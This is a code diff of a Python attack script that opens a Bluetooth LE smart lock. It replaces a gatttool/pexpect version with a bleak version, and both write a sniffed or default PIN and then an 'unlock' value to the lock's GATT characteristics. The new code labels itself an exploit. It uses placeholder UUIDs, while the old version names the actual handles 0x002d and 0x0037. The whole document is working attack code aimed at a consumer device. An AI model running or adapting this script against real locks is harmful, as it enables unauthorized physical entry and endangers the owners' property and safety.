@@ -1,44 +1,46 @@
-import pexpect
+import asyncio
+from bleak import BleakClient
 
-# Color Codes for Printing
+# Color codes for terminal output
 G = "\033[32m"
 Y = "\033[33m"
-B = "\033[34m"
 R = "\033[31m"
 RES = "\033[0m"
 
-# Ask for MAC address input with a default value
-device = input('Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ')
-if not device:
-    device = "11:22:33:44:55:66"
+# Default target MAC address
+target_mac = input("Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ").strip()
+if not target_mac:
+    target_mac = "11:22:33:44:55:66"
 
-# Char-write-req values
-# 0x0037 - GATT code for unlocking the lock
-# 0x002d - GATT code for sending the pincode
-char_values = {
-    "passcode": ("0x002d", "0000"), # Change pincode 0000, if not defaults
-    "unlock": ("0x0037", "01")
-}
+# GATT Characteristics UUIDs or handles (replace with actual UUIDs if available)
+PASSCODE_CHAR_HANDLE = "0000xxxx-0000-1000-8000-00805f9b34fb"  # Replace with actual UUID
+UNLOCK_CHAR_HANDLE = "0000yyyy-0000-1000-8000-00805f9b34fb"    # Replace with actual UUID
 
-print(f"{Y}[-]{RES} Starting Gattool ....")
-child = pexpect.spawn("gatttool -I")  # Linux alternative to connect Bluetooth devices
+# Values to write
+passcode_value = bytearray(b"0000")  # default PIN code
+unlock_value = bytearray([0x01])     # unlock command
 
-# Connect to device
-print(f"{Y}[-]{RES} Connecting to device {device} ....")
-child.sendline(f"connect {device}")
-child.expect("Connection successful", timeout=5)
-print(f"{G}[+]{RES} Connected!")
+async def exploit_ble_lock(mac):
+    try:
+        print(f"{Y}[-]{RES} Connecting to device {mac} ...")
+        async with BleakClient(mac) as client:
+            if await client.is_connected():
+                print(f"{G}[+]{RES} Connected to {mac}")
 
-# Connect with sniffed passcode
-print(f"{G}[+]{RES} Write privileges successful with sniffed passcode")
-child.sendline(f"char-write-req {char_values['passcode'][0]} {char_values['passcode'][1]}")  # Pairing Pin Code - Interaction With Lock
-child.expect("Characteristic value was written successfully", timeout=10)
-print(f"{G}[+]{RES} Characteristics {char_values['passcode'][0]} has been written to Device")
+                print(f"{Y}[-]{RES} Sending PIN code...")
+                await client.write_gatt_char(PASSCODE_CHAR_HANDLE, passcode_value, response=True)
+                print(f"{G}[+]{RES} PIN code written to {PASSCODE_CHAR_HANDLE}")
 
-# Send write operation to unlock
-print(f"{Y}[-]{RES} Sending Write Request 01")
-child.sendline(f"char-write-req {char_values['unlock'][0]} {char_values['unlock'][1]}")  # Sending a write request to Lock to Open - Interaction 2 with lock 
-child.expect("Characteristic value was written successfully", timeout=10)
-print(f"{G}[+]{RES} Write Request Successful")
-print(f"{G}[+]{RES} Exit hcitool gracefully")
-child.expect("\r\n", timeout=10)
+                print(f"{Y}[-]{RES} Sending Unlock command...")
+                await client.write_gatt_char(UNLOCK_CHAR_HANDLE, unlock_value, response=True)
+                print(f"{G}[+]{RES} Unlock command written to {UNLOCK_CHAR_HANDLE}")
+
+                print(f"{G}[+]{RES} Lock should now be open!")
+
+            else:
+                print(f"{R}[!] Failed to connect to {mac}")
+    except Exception as e:
+        print(f"{R}[!] Error: {e}")
+
+# Run the exploit
+asyncio.run(exploit_ble_lock(target_mac))
